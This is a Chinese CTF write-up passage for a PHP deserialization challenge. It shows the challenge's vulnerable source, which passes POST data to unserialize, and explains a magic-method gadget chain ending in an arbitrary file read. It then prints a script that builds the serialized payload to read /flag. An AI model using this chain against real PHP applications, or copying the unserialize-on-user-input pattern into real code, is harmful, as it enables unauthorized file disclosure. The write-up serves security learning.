#### 解题过程

  ```assembly

  ```

  ```html
  <span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'data'</span>
  ```

  发现存在类似于`php`的反序列化漏洞

- 查找一下有没有存在`<?php`的字符串

  ```php
  <?php
  error_reporting(0);
  class A {
      public $handle;
      public function triggerMethod() {
          echo "" . $this->handle; 
      }
  }
  class B {
      public $worker;
      public $cmd;
      public function __toString() {
          return $this->worker->result;
      }
  }
  class C {
      public $cmd;
      public function __get($name) {
          echo file_get_contents($this->cmd);
      }
  }
  $raw = isset($_POST['data']) ? $_POST['data'] : '';
  header('Content-Type: image/jpeg');
  readfile("muzujijiji.jpg");
  highlight_file(__FILE__);
  $obj = unserialize($_POST['data']);
  $obj->triggerMethod();
  ```

  **分析**

  - Class A：`triggerMethod()` 方法简单地输出 `$this->handle` 属性的值
  - Class B：拥有 `__toString()` 方法，当 B 对象被当作字符串使用时（如 `echo`），会自动调用该方法
  - Class C：拥有 `__get()` 方法，当访问 C 对象不存在的属性时会触发该方法，方法内部调用 `file_get_contents($this->cmd)` 可以读取任意文件

**构造ROP链**

```php
<?php
class C {
    public $cmd;
}

class B {
    public $worker;
    public $cmd;
}

class A {
    public $handle;
}

$c = new C();
$c->cmd = '/flag';

$b = new B();
$b->worker = $c;

$a = new A();
$a->handle = $b;

echo serialize($a);
?>
```
